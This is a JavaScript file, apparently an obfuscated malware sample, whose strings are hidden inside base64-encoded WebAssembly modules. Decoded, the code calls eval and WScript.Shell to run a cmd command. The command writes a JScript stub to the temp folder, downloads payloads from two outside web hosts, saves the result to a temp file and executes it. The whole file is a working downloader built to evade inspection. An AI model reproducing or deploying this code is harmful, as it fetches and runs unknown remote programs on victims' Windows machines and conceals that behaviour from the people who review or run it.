const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGlYCAgAAEfwBBAQt/AEEIC38AQTILfwBBOAsHqoCAgAAFBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMLw5aAgAAEAEEBCwVldmFsAABBCAspbmV3JTIwQWN0aXZlWE9iamVjdCglMjJXU2NyaXB0LlNoZWxsJTIyKQAAQTILBFJ1bgAAQTgL+xVDTUQlMjAlMjAlMjAlMjAlMkZjJTIwZWNobyUyMGV2YWwodW5lc2NhcGUoV1NjcmlwdC5Bcmd1bWVudHMoMCkpKSUyMCUzRSUyMCUyNVRFTVAlMjUlNUM3Njc4Mjc4NS5UWFQlMjAlMjYlMjYlMjB0aW1lb3V0JTIwMyUyMCUyNiUyNiUyMHdzY3JpcHQlMjAlMkZFJTNBSlNjcmlwdCUyMCUyNVRFTVAlMjUlNUM3Njc4Mjc4NS5UWFQlMjAlMjIlMjUyOGZ1bmN0aW9uJTI1MjglMjUyOSUyNTdCJTI1M0J0UUlOSG52JTI1M0QlMjUyMCUyNTI4MjQyMTklMjUyQyUyNTIyJTI1MjVUJTI1MjIlMkIlMjUyMkVNUCUyNTI1JTI1MjIlMjUyOSUyNTNCZUF0QkZ2JTI1M0QlMjUyMCUyNTI4MzAwMDQlMjUyQyUyNTIyRXglMjUyMiUyQiUyNTIyZWMlMjUyMiUyNTI5JTI1M0JSRFBPaiUyNTNEJTI1MjAlMjUyODMyMDMwJTI1MkMlMjUyMm5lJTI1MjIlMkIlMjUyMnclMjUyMEFjdGl2ZVhPYmplY3QlMjUyOCUyNTVDJTI1MjJBRE9EQi5TdHJlYW0lMjU1QyUyNTIyJTI1MjklMjUyMiUyNTI5JTI1M0JwaUduakV4JTI1M0QlMjUyMCUyNTI4ODQ5NTQlMjUyQyUyNTIyb3AlMjUyMiUyQiUyNTIyZW4lMjUyMiUyNTI5JTI1M0JHV1phbSUyNTNEJTI1MjAlMjUyODU3MDExJTI1MkMlMjUyMkV4JTI1MjIlMkIlMjUyMnBhbmRFbnZpcm9ubWVudFN0cmluZ3MlMjUyMiUyNTI5JTI1M0JLdGNibCUyNTNEJTI1MjAlMjUyODgwMzMwJTI1MkMlMjUyMmh0JTI1MjIlMkIlMjUyMnRwJTI1M0ElMkYlMkZob3Jjb3IuY29tJTJGZXNlLnRmJTI1MjIlMjUyOSUyNTNCekVJSiUyNTNEJTI1MjAlMjUyODM0OTUzJTI1MkMlMjUyMnR5JTI1MjIlMkIlMjUyMnBlJTI1MjIlMjUyOSUyNTNCVHdTUlElMjUzRCUyNTIwJTI1MjgzMDE2JTI1MkMlMjUyMm5lJTI1MjIlMkIlMjUyMnclMjUyMEFjdGl2ZVhPYmplY3QlMjUyOCUyNTVDJTI1MjJNc3htbDIuU2VydmVyWE1MSFRUUCUyNTVDJTI1MjIlMjUyOSUyNTIyJTI1MjklMjUzQm9oalFDWCUyNTNEJTI1MjAlMjUyODQyODM2JTI1MkMlMjUyMmV2JTI1MjIlMkIlMjUyMmFsJTI1MjIlMjUyOSUyNTNCTWpySSUyNTNEJTI1MjAlMjUyODQ3MTE1JTI1MkMlMjUyMnNhJTI1MjIlMkIlMjUyMnZlVG9GaWxlJTI1MjIlMjUyOSUyNTNCQkxhT0duSSUyNTNEJTI1MjAlMjUyODI1MzgxJTI1MkMlMjUyMmh0JTI1MjIlMkIlMjUyMnRwJTI1M0ElMkYlMkZ3d3cubmVtY2ljZW5hZGhhbm91LmN6JTJGbnZkdGltZS5wcnMlMjUyMiUyNTI5JTI1M0JIU01HYUlFUSUyNTNEJTI1MjAlMjUyODE4MjQ2JTI1MkMlMjUyMnNlJTI1MjIlMkIlMjUyMm5kJTI1MjIlMjUyOSUyNTNCQXRaVCUyNTNEJTI1MjAlMjUyODM1MzgyJTI1MkMlMjUyMldyJTI1MjIlMkIlMjUyMml0ZSUyNTIyJTI1MjklMjUzQkZGTU56ck8lMjUzRCUyNTIwJTI1MjgyMTQ3OCUyNTJDJTI1MjJyZSUyNTIyJTJCJTI1MjJzcG9uc2VCb2R5JTI1MjIlMjUyOSUyNTNCYWp0Z0Z2JTI1M0QlMjUyMCUyNTI4NzI4MDYlMjUyQyUyNTIyR0UlMjUyMiUyQiUyNTIyVCUyNTIyJTI1MjklMjUzQmlMbUxRWFolMjUzRCUyNTIwJTI1Mjg5MTk2MSUyNTJDJTI1MjIlMjU1QyUyNTVDJTI1MjIlMkIlMjUyMnRtcDQ4NDQzMC4zNjElMjUyMiUyNTI5JTI1M0JOdVJWJTI1M0QlMjUyMCUyNTI4Mjg2MSUyNTJDJTI1MjJuZSUyNTIyJTJCJTI1MjJ3JTI1MjBBY3RpdmVYT2JqZWN0JTI1MjglMjU1QyUyNTIyV1NjcmlwdC5TaGVsbCUyNTVDJTI1MjIlMjUyOSUyNTIyJTI1MjklMjUzQnFqbENmJTI1M0QlMjUyMCUyNTI4NDE5MDElMjUyQ3RoaXMlMjU1Qm9oalFDWCUyNTVEJTI1MjhOdVJWJTI1MjklMjUyOSUyNTNCbndQRyUyNTNEJTI1MjAlMjUyODkyODM4JTI1MkN0aGlzJTI1NUJvaGpRQ1glMjU1RCUyNTI4UkRQT2olMjUyOSUyNTI5JTI1M0J2UHBnQSUyNTNEJTI1MjAlMjUyODkyNzg3JTI1MkN0aGlzJTI1NUJvaGpRQ1glMjU1RCUyNTI4VHdTUlElMjUyOSUyNTI5JTI1M0JDTXFwVWdaYiUyNTNEJTI1MjAlMjUyODMxOTg3JTI1MkNxamxDZiUyNTVCR1daYW0lMjU1RCUyNTI4dFFJTkhudiUyNTI5JTJCaUxtTFFYWiUyNTI5JTI1M0Jud1BHJTI1NUJ6RUlKJTI1NUQlMjUzRCUyNTIwJTI1Mjg4ODA1OCUyNTJDMSUyNTI5JTI1M0Jud1BHJTI1NUJwaUduakV4JTI1NUQlMjUyOCUyNTI5JTI1M0JyY1pYeHFjJTI1M0QlMjUyMCUyNTI4MTc2OCUyNTJDbnVsbCUyNTI5JTI1M0J0cnklMjU3QnZQcGdBJTI1NUJwaUduakV4JTI1NUQlMjUyOGFqdGdGdiUyNTJDS3RjYmwlMjUyQ2ZhbHNlJTI1MjklMjUzQnZQcGdBJTI1NUJIU01HYUlFUSUyNTVEJTI1MjglMjUyOSUyNTNCcmNaWHhxYyUyNTNEJTI1MjAlMjUyODY5MzcwJTI1MkN2UHBnQSUyNTVCRkZNTnpyTyUyNTVEJTI1MjklMjUzQm53UEclMjU1QkF0WlQlMjU1RCUyNTI4cmNaWHhxYyUyNTI5JTI1M0IlMjU3RGNhdGNoJTI1MjhlS2lOalNLJTI1MjklMjU3QiUyNTdEaWYlMjUyOG51bGwlMjUzRCUyNTNEcmNaWHhxYyUyNTI5JTI1N0J0cnklMjU3QnZQcGdBJTI1NUJwaUduakV4JTI1NUQlMjUyOGFqdGdGdiUyNTJDQkxhT0duSSUyNTJDZmFsc2UlMjUyOSUyNTNCdlBwZ0ElMjU1QkhTTUdhSUVRJTI1NUQlMjUyOCUyNTI5JTI1M0JyY1pYeHFjJTI1M0QlMjUyMCUyNTI4MTgyNjUlMjUyQ3ZQcGdBJTI1NUJGRk1OenJPJTI1NUQlMjUyOSUyNTNCbndQRyUyNTVCQXRaVCUyNTVEJTI1MjhyY1pYeHFjJTI1MjklMjUzQiUyNTdEY2F0Y2glMjUyOGxFd2lHJTI1MjklMjU3QiUyNTdEJTI1N0Rud1BHJTI1NUJNanJJJTI1NUQlMjUyOENNcXBVZ1piJTI1MkMyJTI1MjklMjUzQnFqbENmJTI1NUJlQXRCRnYlMjU1RCUyNTI4Q01xcFVnWmIlMjUyOSUyNTNCJTI1N0QlMjUyOSUyNTI4JTI1MjklMjUzQiUyMgA='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
(() => {
    const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                this[lS(0, 0)](lS(0, 1))[lS(0, 2)](lS(0, 3), 0);
            }
        }
    });
    const __exports = __callInstance0.exports;
    return __exports.data();
})();